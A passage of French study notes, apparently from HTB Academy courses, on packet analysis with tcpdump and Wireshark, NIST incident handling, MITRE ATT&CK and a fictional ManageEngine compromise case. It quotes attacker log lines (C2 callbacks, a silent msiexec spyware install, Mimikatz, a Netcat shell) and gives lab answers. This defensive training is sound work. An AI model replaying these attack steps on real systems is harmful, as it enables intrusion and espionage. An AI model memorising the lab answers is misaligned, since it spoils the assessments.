    ```
    
- Taille de paquet :
    
    ```bash
    less 64
    greater 500
    
    ```
    
- Combinaisons :
    - `and`, `or`, `not` (ou `&&`, `||`, `!`)

Exemples :

- Trafic destiné au réseau local :
    
    ```bash
    sudo tcpdump -i eth0 dst net 172.16.146.0/24
    
    ```
    
- Paquets avec le flag SYN TCP (scan, début de connexions) :
    
    ```bash
    sudo tcpdump -i eth0 'tcp[13] & 2 != 0'
    
    ```
    
- Pipe en temps réel vers `grep` (avec `l`) :
    
    ```bash
    sudo tcpdump -Ar http.cap -l | grep 'mailto:'
    
    ```
    

## Wireshark, TShark & Termshark

### Wireshark – Interface graphique

Wireshark propose trois panneaux principaux :

1. **Packet List**
    - Numéro, temps, source, destination, protocole, informations
2. **Packet Details**
    - Découpage par couches (Ethernet, IP, TCP, HTTP, etc.)
3. **Packet Bytes**
    - Affichage en hexadécimal + ASCII, avec surbrillance de la zone sélectionnée

Deux familles de filtres :

- **Capture Filters** (avant la capture – syntaxe BPF)
    - ex : `host 10.1.1.1 and port 80`
- **Display Filters** (pendant ou après – syntaxe Wireshark)
    - ex : `ip.addr == 192.168.1.10 && http`

Exemples de display filters :

- `ip.addr == 172.16.146.2`
- `dns`, `tcp`, `ftp`, `arp`, `http`
- `tcp.port == 80`
- `tcp.port != 80`
- Combinaisons : `and`, `or`, `not`

### TShark

Version CLI de Wireshark :

- Lister les interfaces :
    
    ```bash
    tshark -D
    
    ```
    
- Capturer sur une interface :
    
    ```bash
    sudo tshark -i eth0 -w /tmp/test.pcap
    
    ```
    
- Lire un PCAP :
    
    ```bash
    tshark -r /tmp/test.pcap
    
    ```
    
- Appliquer un filtre de capture :
    
    ```bash
    sudo tshark -i eth0 -f "host 172.16.146.2"
    
    ```
    
- Afficher Hex + ASCII : `x`

### Termshark

- Interface en mode texte (TUI) façon Wireshark dans le terminal.
- Utilise les mêmes concepts que TShark / tcpdump, mais avec une interface interactive.

## Wireshark – Usage avancé

### Plugins : Statistics & Analyze

- **Statistics**
    - Vue globale : Hierarchie de protocoles, Conversations, Endpoints, top talkers…
- **Analyze**
    - `Follow TCP Stream`
    - Application de filtres
    - `Expert Info` : erreurs, retransmissions, problèmes de protocole…

### Follow TCP Stream & extraction de fichiers

Wireshark peut **reconstituer un flux TCP** et en extraire le contenu :

1. Clic droit sur un paquet → *Follow* → *TCP Stream*
2. Voir la conversation complète (client/serveur en couleurs différentes)
3. Changer “Show and save data as” en **Raw** et sauvegarder dans un fichier

Pour **FTP** :

- `ftp` → vue globale des échanges FTP
- `ftp.request.command` → commandes (USER, PASS, RETR, etc.)
- `ftp-data` → données transférées (TCP 20), utile pour reconstruire des fichiers

Pour **HTTP** :

- Filtre `http` pour voir `GET`, `POST`, `HTTP/1.1 200 OK`, etc.
- `File → Export Objects → HTTP` permet d’exporter :
    - images (ex : `Rise-Up.jpg`)
    - scripts
    - fichiers téléchargés

C’est comme ça qu’on peut extraire une image contenant un “Transformer Leader” dans le lab (`Rise-Up.jpg`).

### Déchiffrer RDP

- RDP utilise généralement TLS sur le port TCP **3389** → trafic chiffré
- Avec la **clé privée RSA** du serveur (`server.key`), on peut donner la clé à Wireshark :
    1. `Edit → Preferences → Protocols → TLS`
    2. Dans *RSA Keys List* :
        - IP : `10.129.43.29` (exemple)
        - Port : `3389`
        - Protocole : `tpkt`
        - Key file : `server.key`

Après rechargement :

- Le filtre `rdp` affiche les PDU RDP en clair
- On peut alors voir :
    - quel **client** a initié la session
    - quel **compte utilisateur** a été utilisé (ex : `bucky`)
    - quelles actions ont été effectuées sur le serveur distant

## Scénarios & cas d’usage vus dans les labs

Les labs mettent en scène plusieurs scénarios pratiques :

- Un employé **bob** soupçonné de comportements malveillants
- Création d’un nouvel utilisateur `hacker` sur un autre host via un shell (Netcat)
- Utilisation d’un port non standard **4444** pour une connexion suspecte
- Identification du serveur DNS interne `172.16.146.1`
- Trafic HTTP/FTP entre différents hôtes, récupération de fichiers, extraction d’images
- Déchiffrement d’une session RDP pour voir :
    - qui se connecte sur quel serveur
    - avec quel compte (`bucky`)
    - depuis quelle machine

Ces exercices illustrent une démarche complète :

1. partir d’un simple “comportement bizarre”,
2. capturer le trafic au bon endroit,
3. filtrer progressivement,
4. remonter jusqu’à des actions précises :
    - transfert de fichiers
    - création d’utilisateur
    - exécution de commandes à distance

## Conclusion

Ce module m’a permis de :

- consolider les **bases réseau** (OSI/TCP/IP, TCP/UDP, principaux protocoles applicatifs)
- apprendre à utiliser **tcpdump** de façon fine (switches, filtres BPF, PCAP)
- maîtriser les notions de **capture filters** et **display filters** dans **Wireshark**
- exploiter des fonctions avancées :
    - Follow TCP Stream
    - extraction de fichiers HTTP/FTP
    - statistiques globales
    - Expert Info
- voir concrètement comment **analyser un incident** réseau de bout en bout :
    - de la suspicion initiale jusqu’à l’identification d’un compte (ex. `bucky`, `bob`, `hacker`),
    - d’un port (ex. `4444`),
    - ou d’un serveur clé (`172.16.146.1`).

## **Incident Handling Process**

## Contexte du module

Dans ce module HTB Academy, je suis dans le rôle d’**analyste SOC / incident handler junior**.
Objectifs principaux :

- Comprendre les **fondamentaux de l’Incident Handling** (IH) selon NIST.
- Savoir utiliser des **frameworks d’attaque** (Cyber Kill Chain, MITRE ATT&CK, Pyramid of Pain).
- Prendre en main un **outil de case management** : **TheHive**.
- Travailler sur une **étude de cas réaliste** : la compromission d’**Insight Nexus** (ManageEngine + AD + GPO + exfiltration).
- Faire un peu de **pratique logs / Wazuh** (IOC, credential dumping, persistence, exfiltration, PowerShell malveillant, etc.).
    
    ![image.png](image%202.png)
    

## Notions de base : événements, incidents & incident handling

### Événement vs incident

- **Événement (event)** : action qui se produit sur un système ou un réseau.
    - Ex : un utilisateur envoie un mail, un clic souris, un firewall accepte un flux.
- **Incident** : événement avec un **impact négatif**.
    - Ex : crash système, accès non autorisé, vol de données, ransomware, etc.

Dans le module, un **incident de sécurité IT** est défini comme :

> un événement exécuté contre un système informatique avec une intention claire de nuire.
> 

Exemples :

- Vol de données / fonds.
- Accès non autorisé à des données.
- Installation de malware / RAT.

**Incident handling** = ensemble de **procédures structurées** pour **gérer et répondre** aux incidents dans un environnement IT.

### Pourquoi l’Incident Handling est critique ?

- Les incidents touchent souvent des **données personnelles / business**.
- Impact très variable : de quelques postes à une grosse partie du SI.
- Une équipe d’Incident Response **formée** :
    - Réagit **rapidement et systématiquement**.
    - Limite le **vol de données** et la **disruption de services**.
- Les décisions **avant, pendant et après** l’incident conditionnent la gravité finale.

Notions importantes :

- **Priorisation** : tous les incidents n’ont pas le même impact.
On priorise selon la **sévérité**, le **nombre de systèmes touchés**, les **actifs critiques**, etc.
- **Incident Manager** :
    - Souvent SOC Manager, CISO/CIO ou prestataire de confiance.
    - Point de contact unique.
    - Coordonne les équipes, collecte les infos, suit les actions.

Une des références majeures : le **NIST “Computer Security Incident Handling Guide”**, qui fournit un modèle en 4 phases.

## Frameworks d’attaque et de détection

### Cyber Kill Chain

Le **Cyber Kill Chain** décrit le **cycle de vie d’une attaque** en 7 étapes :

1. **Reconnaissance (Recon)**
    - Choix de la cible, collecte d’infos : OSINT (LinkedIn, sites web, doc, job ads…), ou scans actifs (ports, services, apps exposées).
2. **Weaponize (Armement)**
    - Développement de la **malware / exploit initial**.
    - Payload léger, souvent furtif, capable de :
        - donner un accès distant,
        - persister,
        - télécharger d’autres outils.
    - C’est **à ce stade** que **le malware est développé** (réponse à la question du module).
3. **Delivery (Livraison)**
    - Livraison du payload : phishing (pièce jointe ou lien), site web piégé, USB, téléphone + social engineering, etc.
    - But : que la victime **exécute** le truc (double-clic, macro, script…).
4. **Exploitation**
    - Le code malveillant est **exécuté** sur la machine cible (exploit, script, shellcode…).
5. **Installation**
    - Mise en place de la **persistance** :
        - **Droppers**
        - **Backdoors**
        - **Rootkits**
    - Le “stager” initial installe ou télécharge d’autres composants.
6. **Command & Control (C2)**
    - L’attaquant établit un **canal de commande** (HTTP(S), DNS, etc.).
    - Permet de **contrôler la machine**, télécharger de nouveaux modules, etc.
7. **Actions on Objective**
    - Objectif final : exfiltration de données, ransomware, destruction, espionnage, etc.

Important :
Le Kill Chain n’est **pas linéaire** en pratique. Les attaquants reviennent souvent en arrière (ex : après une première compromission, ils refont de la recon pour pivoter plus loin).

### MITRE ATT&CK

**MITRE ATT&CK** = matrice de **tactiques** et **techniques** basée sur des comportements adverses observés dans le monde réel.

- **Tactic** = **objectif** haut niveau de l’attaquant (Initial Access, Persistence, Privilege Escalation, etc.).
- **Technique** = **façon concrète** de réaliser la tactique.
    - Identifiée par un **ID** : `T1105`, `T1021`, etc.
- **Sub-technique** = variante précise d’une technique.
    - Ex : `T1003.001` = Credential Dumping – LSASS Memory.

Exemples vus dans le module :

- `T1105 – Ingress Tool Transfer`
→ transfert d’outils/malwares depuis un C2 (wget, curl, etc.).
- `T1021 – Remote Services`
→ usage de SSH/RDP/SMB pour mouvement latéral.
- `T1003.001 – OS Credentials: LSASS Memory`
→ dump mémoire de LSASS pour voler les creds.
- `T1486 – Data Encrypted for Impact`
→ ransomware.

ATT&CK permet :

- De **décrire précisément** ce qu’on observe (“on a vu T1003.001”).
- De **prioriser** les alertes.
- De pointer vers des **mitigations** standard.

### Pyramid of Pain

La **Pyramid of Pain** illustre la difficulté pour un attaquant de changer ses IOC/TTP :

- Bas de la pyramide (faible “pain”) :
    - **Hashs**, **IP**, **domaines** → triviales à changer.
- Milieu :
    - **Artifacts réseau/host** (fichiers, registres, mutex…).
    - **Outils** → déjà plus pénible à remplacer.
- Sommet :
    - **TTPs (tactics, techniques, procedures)** → cœur de MITRE ATT&CK.

Conclusion :

- Bloquer **juste des IP / hashs** = l’attaquant change 3 paramètres et continue.
- Détecter les **comportements MITRE / TTP** = **coût maximal** pour l’adversaire.

### Intégration MITRE ATT&CK dans TheHive

- **TheHive** sert de **plateforme de gestion d’alertes et de cas**.
- On peut :
    - importer les **tactiques/techniques MITRE**,
    - mapper des alertes (ex : Mimikatz → `T1003.001`),
    - ajouter des **observables/IOCs** (IP, fichiers, hash, hostname…),
    - suivre l’investigation dans un **case** centralisé.

## Processus d’Incident Handling (NIST)

NIST découpe l’Incident Handling en **4 phases** :

1. **Preparation**
2. **Detection & Analysis**
3. **Containment, Eradication & Recovery**
4. **Post-Incident Activity**

C’est un **cycle**, pas une ligne droite. On peut revenir en arrière (ex : si des IOCs réapparaissent en Recovery → retour Investigation).

### Preparation – Partie 1 : capacité & documentation

Objectif : **être prêt** avant que ça explose.

### Prérequis de préparation

- **Capacité IH dans l’organisation** (interne ou via prestataire).
- **Équipe IH compétente** (incident handlers, SOC, DFIR…).
- **Sensibilisation sécurité** pour le reste des employés.
- **Politiques & documentation** claires.
- **Outils & matériel** adaptés.

### Politiques & docs

Doit inclure :

- Contacts & rôles :
    - membres de l’équipe IH,
    - légal, compliance, IT, management, communication, prestataires, ISP, etc.
- **Incident response policy / plan / procedures**.
- **Politique de partage d’info** (internes, externes, CERT, autorités…).
- **Baselines / golden image** des systèmes.
- **Cartographie réseau** & **CMDB** (assets).
- Comptes **privilégiés d’urgence**, activables en cas d’incident puis désactivés + reset mot de passe.
- Possibilité d’acheter rapidement un outil (< $500) sans process d’achat complet.
- **Cheat sheets forensic / investigative**.
- Processus pour les obligations légales (ex : **RGPD** → notification dans un délai donné).

### Reporting & notes d’incident

Pendant l’incident, il faut **tout noter** :

- Qui ? Quoi ? Quand ? Où ? Pourquoi ? Comment ?
- **Timestamps**, actions effectuées, résultats, qui l’a fait.
- Ce sera la base du **rapport final** + de la **preuve en cas légal**.

### Preparation – Partie 2 : mesures de protection

Même si la “protection” n’est pas uniquement le boulot de l’équipe IH, elle doit connaître **ce qui est en place** pour comprendre :

- ce qui est possible côté logs / detections,
- le niveau de **sophistication** de l’attaque.

### DMARC – anti-phishing

- Basé sur **SPF + DKIM**, DMARC permet de **rejeter** des mails qui prétendent venir de notre domaine.
- Très utile contre les **fraudes par mail** (faux comptable, faux CEO…).
- **Attention aux tests** → mal configuré, ça peut bloquer des mails légitimes, notamment ceux envoyés “on behalf of”.

### Endpoint hardening & EDR

Endpoints = principale **porte d’entrée** (phishing, navigateurs, PJ, scripts).

Points clés :

- Appliquer des **baselines** (CIS / Microsoft).
- Désactiver **LLMNR / NetBIOS**.
- Implémenter **LAPS**, supprimer les droits admin aux users standard.
- Configurer **PowerShell** en **ConstrainedLanguage**.
- Activer les règles **ASR** (Attack Surface Reduction).
- **Whitelisting** / contrôle d’exécution :
    - Bloquer l’exécution depuis les dossiers **user-writable** (Downloads, Desktop, AppData…).
    - Bloquer les scripts `.hta`, `.vbs`, `.bat`, `.cmd`, `.js`…
    - Faire attention aux **LOLBins** (Living-Off-The-Land Binaries).
- **EDR** intégrant **AMSI** pour inspecter les scripts obfusqués.

### Protection réseau

- **Segmentation** : isoler les systèmes critiques, limiter strictement les flux nécessaires.
- Pas d’expo directe d’assets internes sur Internet (DMZ si besoin).
- **IDS/IPS** :
    - idéalement avec **décryptage TLS** pour analyser le contenu, pas seulement l’IP.
- **Contrôle d’accès au réseau** :
    - 802.1X sur LAN/Wi-Fi.
    - En cloud, **Conditional Access** (ex. Entra ID) pour n’autoriser que les devices gérés.

### Identités / MFA / mots de passe

- Vol de crédentials privilégiés = **chemin d’escalade n°1**.
- Mauvaises pratiques :
    - mot de passe “complexe” mais trivial (`Password1!`, `Summer2021!`).
    - même mot de passe entre compte normal et compte admin.
- Recommandé :
    - **Passphrases** longues, éventuellement multilingues.
    - **MFA** au minimum sur tous les accès admins / sensibles.

### Vulnérabilités & user awareness

- **Scans de vulnérabilité** réguliers → patcher les “High” & “Critical”.
- Segmentation ou compensations si patch impossible.
- **Sensibilisation utilisateurs** :
    - formation aux mails suspects, comportements anormaux,
    - tests réguliers (phishing simulé, clés USB abandonnées, etc.).

### AD security & purple teaming

- **Audit AD** (en interne ou par presta) pour :
    - trouver les escalades faciles,
    - corriger les config dangereuses,
    - éliminer les “one-click pwn”.
- **Purple team** :
    - Red Team attaque,
    - Blue Team observe & défend,
    - on itère sur les playbooks et la détection (logs, alertes, corrélation).

## Detection & Analysis

### Sources de détection

Un incident peut être détecté par :

- un **employé** qui remarque un comportement étrange,
- un **outil** (EDR, IDS, firewall, SIEM…),
- des activités de **threat hunting**,
- un **tiers** (CERT, partenaire, fournisseur, autorité, etc.).

On met en place plusieurs **couches de détection** :

1. **Périmètre** : firewalls, NIDS/NIPS, DMZ.
2. **Réseau interne** : HIDS/HIPS, firewalls locaux.
3. **Endpoints** : AV/EDR.
4. **Applications** : logs applicatifs, web server logs, etc.
    
    ![image.png](image%203.png)
    

### Investigation initiale & timeline

Avant de déclencher la grosse artillerie, on fait une **investigation initiale** :

- Quand l’incident a-t-il été signalé ? Par qui ?
- Comment a-t-il été détecté ?
- Quel type d’incident (phishing, indispo, compromission, etc.) ?
- Quels systèmes sont impactés ?
- Qui a accédé aux systèmes, quelles actions ont déjà été faites ?
- Contexte technique :
    - OS, IP, hostname, owner, rôle, état actuel.
- Si malware :
    - liste des IP C2, horodatage, types de malware,
    - hash, noms de fichiers, copies pour analyse.

On construit ensuite une **timeline** avec au minimum :

- Date
- Heure
- Hostname
- Description de l’événement
- Source de données (logs, AV, EDR, etc.)

Exemple du module :

> 09/09/2021 – 13:31 CET – SQLServer01 – Mimikatz détecté – Antivirus
> 

Cette timeline sert à :

- garder une **vision globale**,
- mettre les indices dans l’ordre,
- savoir si un événement appartient ou non à l’incident en cours.

### Sévérité, étendue & communication

Questions à se poser :

- Quel est l’**impact** de l’exploitation ?
- Quels sont les **pré-requis** pour exploiter ?
- Systèmes **critiques** potentiellement impactés ?
- Combien de systèmes touchés ?
- Exploit connu, utilisé “dans la nature” ?
- Comportement de **ver / worm** ?

Les incidents graves sont **escaladés** en priorité.

**Confidentialité** :

- Les infos d’incident sont **need-to-know**.
- L’attaquant peut être interne.
- La com interne/externe doit être gérée par les bonnes personnes (legal, com…).

### Boucle d’investigation (IOCs → nouveaux leads → collecte)

Le processus d’enquête suit une boucle en 3 étapes :

1. **Création & usage d’IOCs**
2. **Découverte de nouveaux leads / systèmes compromis**
3. **Collecte & analyse de données sur ces systèmes**

### IOCs

IOC = **indicateur de compromission**.
Exemples : IP, hash de fichier, nom de fichier, clé de registre…

On peut :

- les décrire dans des formats comme **OpenIOC**, **YARA**, **STIX** (JSON).
- les utiliser pour **scanner l’environnement** à la recherche d’autres machines compromises.
- dans TheHive, les ajouter via l’onglet **Observables**, avec un flag “Is IOC”.

Attention :

- Certains IOCs sont **trop génériques** → beaucoup de faux positifs.
- On doit **prioriser** sur les systèmes susceptibles de donner de nouvelles infos.

### Collecte & forensics

Deux approches principales :

- **Live response** (machine allumée) :
    - memory dump, process list, connexions réseau, fichiers récents, etc.
- **Analyse offline** :
    - shutdown contrôlé (en évitant de flinguer des preuves critiques),
    - disque cloné, etc.

Points importants :

- Limiter les **modifications** sur le système.
- Conserver une **chain of custody** propre (admissible en justice).
- La **memory forensics** devient de plus en plus cruciale dans les attaques avancées.

### Sécurité des outils d’investigation

- Attention aux outils qui **cachent les credentials** sur la machine distante.
    - Ex : `PsExec` avec credentials explicites → creds mis en cache.
    - Utilisation avec contexte courant (logon type 3 / WinRM) → pas de cache.

### Rôle de l’IA dans la détection

L’IA est utilisée pour :

- **Triage automatique** des alertes,
- **Corrélation** et reconstruction de timeline,
- **Playbooks automatiques**, réponse semi-automatisée,
- **Post-incident analysis** & amélioration continue.

Ex : **Elastic Security Attack Discovery** :

- Agrège plusieurs alertes,
- Construit un **historique d’attaque** (host, user, phases MITRE…),
- Fournit une vue synthétique de l’incident.

## Containment, Eradication & Recovery

Quand on a une bonne vision de :

- **ce qui s’est passé**,
- **l’ampleur de l’incident**,
- **les systèmes touchés**,

on passe à la phase **Containment, Eradication & Recovery**.

### Containment

Objectif : **empêcher la propagation** de l’attaque.

On distingue :

- **Short-term containment** :
    - actions temporaires, peu intrusives :
        - isolation réseau (VLAN, câble débranché),
        - modification du DNS du C2 vers un sinkhole,
    - permet de **gagner du temps** + faire des images forensic.
- **Long-term containment** :
    - changements plus durables :
        - reset mots de passe,
        - règles firewall permanentes,
        - désactivation de services,
        - patchs, etc.

Important :

- Les actions doivent être **coordonnées** et appliquées sur **toute la surface** en même temps.
Sinon, on alerte l’attaquant et il peut adapter ses TTP.

### Eradication

But : **sortir complètement** l’attaquant de l’environnement.

Exemples d’actions :

- Suppression des malwares & backdoors.
- Rebuild de certains systèmes, restauration depuis backup.
- Application de patchs supplémentaires.
- Renforcement de la config (hardening).

### Recovery

But : **revenir à une exploitation normale**.

- Les métiers vérifient que les systèmes restaurés fonctionnent.
- On remet en prod progressivement.
- **Surveillance renforcée** des systèmes restaurés :
    - logons inhabituels,
    - processus suspects,
    - modifications registres typiques de persistance.

Si des **IOCs réapparaissent pendant recovery**, il faut :

> Repartir en phase Investigation, pas continuer naïvement la recovery.
> 

## Post-Incident Activity

Dernière phase : **capitaliser** sur l’incident.

### Post-mortem & lessons learned

- Réunion avec tous les **stakeholders** (tech, management, legal, com, etc.).
- Analyse :
    - Qu’est-ce qui s’est passé ? Quand ?
    - Comment l’équipe a réagi vs les **playbooks** ?
    - Les métiers ont-ils fourni l’info nécessaire ?
    - Quelles actions ont été faites (containment/eradication/recovery) ?
    - Quelles mesures préventives mettre en place ?
- On met à jour :
    - **politiques**, **playbooks**, **règles de détection**, **formation**.

### Rapport d’incident

Le rapport final documente :

- La chronologie,
- L’impact business,
- Les actions réalisées,
- Les coûts,
- Les recommandations.

Il est utile pour :

- les incidents futurs,
- la communication vers la direction,
- les éventuelles actions légales.

## Étude de cas : compromission Insight Nexus

### Contexte de la cible

- **Insight Nexus** : société de **market research / data analytics**, clients Fortune 500.
- Actifs importants :
    - Application ManageEngine ADManager Plus (exposée Internet).
    - Portail client PHP avec upload de fichiers (`portal.insightnexus.com`).
    - DC : `DC01.insight.local`.
    - File server : `FS01` (`\\\\fs01\\projects`).
    - DB server : `DB01`.
    - Workstations `DEV-001` à `DEV-120`, dont `DEV-021` exposé en RDP.

Sécurité :

- Firewall périmètre avec logs basiques (pas de TI).
- IDS très bruyant (beaucoup de faux positifs).
- Agents **Wazuh** sur une partie des machines.
- SIEM central (Wazuh) + logs Windows, web, firewall.
- **TheHive** pour la gestion des cas, avec **Cortex** pour l’enrichissement.

### Menaces : deux groupes distincts

1. **Crimson Fox** (acteur principal)
    - Groupe avancé, probablement **étatique**, spécialisé dans :
        - vol de credentials,
        - persistance longue durée,
        - espionnage.
2. **Silent Jackal** (acteur secondaire)
    - Groupe criminel opportuniste, bas niveau :
        - defacements,
        - intrusions “pour la signature”.

Les deux opèrent **en parallèle** dans le même environnement, ce qui complexifie la réponse.

### Chaîne d’attaque Crimson Fox

1. **Accès initial via ManageEngine**
    - `manage.insightnexus.com` exposé avec **credentials par défaut `admin/admin`**.
    - Les admins ont oublié de les changer après une mise à jour.
    - Pas de **MFA**, pas de WAF.
    - Logon réussi via console web.
2. **Exploitation d’une RCE Java sur ManageEngine**
    - Vuln Java RCE dans ADManager Plus.
    - L’attaquant exploite la vuln et ouvre un **C2 HTTPS** vers `103.112.60.117`.
    - Log Sysmon (Event ID 3) :
        - `Image: C:\\ManageEngine\\jre\\bin\\java.exe`
        - `DestinationIp: 103.112.60.117`
        - `DestinationPort: 443`
3. **Recon AD & création d’un compte Domain Admin**
    - Enumeration users/computers via ManageEngine.
    - Création d’un compte **Domain Admin** dédié à l’attaquant.
4. **Découverte d’un poste RDP exposé : DEV-021**
    - `DEV-021` a un RDP ouvert vers Internet (usage dev distant).
    - RDP depuis `103.112.60.117` vers `DEV-021` avec le nouveau compte DA.
    - Event 4624 (logon type 10 – RDP) :
        - `SourceNetworkAddress: 103.112.60.117`
        - `New Logon: insight\\svc_deployer`
5. **Accès aux file shares & exfiltration**
    - Parcours des shares sur `FS01`, notamment `\\\\fs01\\projects`.
    - Logs 5140 “A network share object was accessed”.
    - Les données client sont compressées en `diagnostics_data.zip` et envoyées via HTTPS à un IP externe (dans les questions du module : `93.184.216.34`).
6. **Déploiement de spyware via GPO / MSI**
    - Depuis `DEV-021`, exécution de scripts PowerShell avec les creds Domain Admin.
    - Création d’un **GPO** qui pousse un MSI : `C:\\Windows\\Temp\\java-update.msi`.
    - Logs Sysmon :
        - Event 11 → création du fichier MSI.
        - Event 1 → `msiexec /i C:\\Windows\\Temp\\java-update.msi /quiet`.
    - Le MSI installe un **scheduled task** de spyware, déployé sur toutes les machines du domaine via GPO.

Crimson Fox passe ensuite en **mode low noise** : beacons C2 périodiques, faible activité visible.

### Activité Silent Jackal

En parallèle :

- Silent Jackal exploite une vuln **upload de fichier** sur le portail PHP.
- Upload d’un fichier **`checkme.txt`** à la racine du web server, avec texte “SilentJackal was here”.
- Il ne progresse pas plus loin, mais ce **fichier marqueur** provoque une alerte.

Cette activité “bruyante” permet aux défenseurs de **repérer l’incident**, même si le groupe avancé (Crimson Fox) est beaucoup plus discret.

### Découverte & corrélation

- Un admin repère des **connexions sortantes étranges** depuis le serveur ManageEngine vers un IP d’Europe de l’Est.
- Il contacte le **SOC**.
- Un analyste SOC voit l’alerte concernant `checkme.txt` et commence à creuser.
- Problème : beaucoup d’alertes de création de fichier → **alert fatigue**, l’alerte n’avait pas été escaladée.

En corrélant les logs, l’analyste identifie :

- Logins ManageEngine suspects depuis IP étrangères.
- Process `msiexec` exécutant un MSI sur plusieurs hosts.
- Logs d’énumération LDAP & création de GPO.
- Access logs sur le file server (compression & exfil).
- Connexions HTTPS vers l’IP C2.

### Réponse : TheHive & actions IR

1. **Création de cas dans TheHive**
    - Case : **“Insight Nexus — ManageEngine Compromise”**.
    - Liens vers les alertes associées :
        - logins admin ManageEngine,
        - msiexec / MSI,
        - reconnaissance LDAP,
        - upload vers IP externe,
        - événement `checkme.txt`.
    - Attribution des rôles :
        - Triage Analyst,
        - Forensics Lead,
        - Containment Lead,
        - Communications Lead.
    - Priorité : **Critical** (exfil confirmée).
2. **Containment – réseau**
    - Blocage des flux vers `103.112.60.117` sur :
        - firewall périmètre,
        - firewalls Hôte.
    - Règles d’egress temporaires plus strictes.
    - Ajout d’une signature IDS sur cet IP.
3. **Containment – comptes**
    - Désactivation du compte admin ManageEngine.
    - Rotation de tous les comptes privilégiés exposés dans les logs (service, deployer, etc.).
    - Restriction de l’accès à la console ManageEngine à des IP internes seulement.
    - Forcer les reset de mot de passe + invalider les sessions actives.
4. **Isolation hosts**
    - Isolement réseau de :
        - `manage.insightnexus.com`,
        - `DEV-021`,
        - machines avec `java-update.msi` présent / exécuté.
    - Désactivation temporaire de certaines **scheduled tasks** et GPO.
5. **Collecte forensic**
    - Sur les machines isolées :
        - mémoire, process, registres, disques.
    - Export des logs :
        - ManageEngine audit,
        - web access,
        - Wazuh / SIEM.
    - Sauvegarde des fichiers :
        - `java-update.msi`,
        - `diagnostics_data.zip`,
        - éventuels web shells.

### Mapping MITRE ATT&CK

Quelques mappings utilisés :

- **Reconnaissance** :
    - `T1595 – Active Scanning`
- **Initial Access** :
    - `T1078.004 – Valid Accounts (Default Accounts)` pour `admin/admin`.
    - `T1190 – Exploit Public-Facing Application` pour le portail PHP / vuln ManageEngine.
- **Execution / Persistence** :
    - `T1059` – Command & Scripting Interpreter (PowerShell).
    - `T1547` / `T1543` – Persist via services, scheduled tasks, GPO.
- **Credential Access** :
    - `T1003.001 – LSASS Memory` (Mimikatz, VaultCli.dll).
- **Lateral Movement** :
    - `T1021.001 – Remote Desktop Protocol`.
- **C2** :
    - `T1071.001 – Web Protocols` (C2 HTTPS vers 103.112.60.117).
- **Exfiltration** :
    - `T1560` – Archive data (`diagnostics_data.zip`).
    - `T1041` – Exfiltration over C2 channel.

### Leçons apprises

- Les **credentials par défaut sur des applications exposées** sont toujours mortels.
- Plusieurs **acteurs** peuvent être présents simultanément (un “bruyant”, un “furtif”).
- L’absence de **corrélation cross-outils** retarde la détection et donne plus de temps à l’attaquant.
- Supprimer un **fichier indicateur** (ex : `checkme.txt`) ne supprime pas la **cause racine**.
- La **post-compromission** doit systématiquement inclure :
    - rechercher la persistance,
    - vérifier les comptes & GPO,
    - analyser les logs d’exfil.
    
    ## Partie pratique : TheHive & Wazuh
    
    La partie labs demande d’utiliser **TheHive** et des **logs Wazuh** pour compléter des questions.
    
    ### TheHive – Mimikatz & alerts
    
    Exemples de tâches :
    
    - Se connecter à TheHive avec :
    - Ouvrir l’alerte **“[InsightNexus] Hacker tool Mimikatz was detected”**.
    - Lier l’alerte à un cas.
    - Lire les détails :
        - machine touchée,
        - heure,
        - utilisateur qui a lancé Mimikatz (`domain\\user` dans les questions).
    - Mapper l’activité à **MITRE** (Credential Dumping `T1003.001`).
    
    ### Wazuh logs – Credential dumping, persistance, exfil
    
    En téléchargeant **`wazuh_export.zip`**, on retrouve :
    
    - Un événement **4688** montrant une exécution d’outil de credential dumping dont le parent process est :
        - `C:\\Program Files\\Mozilla Firefox\\firefox.exe`
        → typique d’un exécutable téléchargé depuis le navigateur.
    - Une persistance sur `DB01` :
        - `imagePath = C:\\Windows\\PSEXESVC.exe`
        → service PsExec utilisé comme mécanisme de persistance / remote execution.
    - Activité d’exfiltration :
        - upload de `diagnostics_data.zip` vers **`93.184.216.34`**.
    - Accès au share `\\\\fs01\\projects` par l’utilisateur **`svc_admin`**.
    
    On doit :
    
    - Identifier ces événements,
    - les relier au **scénario Crimson Fox**,
    - les utiliser comme **IOCs** pour rechercher d’autres machines touchées.
    
    ### Logs-wazuh.zip & PowerShell malveillant
    
    Dans **`logs-wazuh.zip`** :
    
    - On repère un **script PowerShell suspect**, souvent encodé en Base64 (`EncodedCommand`).
    - Méthode typique :
        1. Repérer la commande dans les logs (Event ID 4104 ou 4688).
        2. Décoder la chaîne Base64 (PowerShell `FromBase64String`/`UTF8` ou outil externe).
        3. Lire la commande en clair :
            - téléchargement de payload depuis un **IP externe** (C2),
            - éventuellement dépôt de fichier, exécution, etc.
        4. En extraire :
            - l’**IP** du C2 (réponse demandée dans le module),
            - le **user** qui a exécuté la commande (`domain\\user`).
    
    Ce type d’activité mappe typiquement à :
    
    - `T1105 – Ingress Tool Transfer` (téléchargement de fichier depuis C2),
    - `T1059 – Command & Scripting Interpreter (PowerShell)`.
    
    ### Enrichissement VirusTotal
    
    Le module demande aussi :
    
    - D’ouvrir l’alerte **“[InsightNexus] Admin Login via ManageEngine Web Console”**.
    - De récupérer un IP externe (commençant par `203...`), puis :
        - chercher cet IP sur **VirusTotal**,
        - regarder les fichiers associés, notamment un fichier qui commence par “Mango…”,
        - ajouter les infos dans les **notes** de l’alerte.
    - De faire pareil pour un IP commençant par `198...` et noter la **ville** dans le WHOIS.
    
    L’idée n’est pas juste de “donner une réponse”, mais de montrer :
    
    - comment **enrichir** un IOC via une plateforme CTI,
    - comment **documenter** ces infos dans TheHive.
    
    ## Ce que j’ai appris (et que je peux réutiliser)
    
    ### Concepts & frameworks
    
    - Différence claire entre **event** et **incident**.
    - Rôle de l’**Incident Manager** et importance de la **priorisation**.
    - Utilisation combinée :
        - **Cyber Kill Chain** pour visualiser la progression de l’attaquant,
        - **MITRE ATT&CK** pour décrire finement les TTP,
        - **Pyramid of Pain** pour privilégier les **détections comportementales** plutôt que les simples IOCs.
    
    ### Processus d’Incident Handling
    
    - Les 4 phases NIST :
        1. **Preparation**
        2. **Detection & Analysis**
        3. **Containment, Eradication & Recovery**
        4. **Post-Incident Activity**
    - Importance de :
        - ne pas **sauter des étapes**,
        - garder une **timeline** à jour,
        - documenter toutes les actions,
        - revenir à **Investigation** si des IOCs réapparaissent.
    
    ### Défense & prévention
    
    - Les vrais **quick wins** :
        - supprimer les **default / weak creds**,
        - **MFA** sur tous les accès admin,
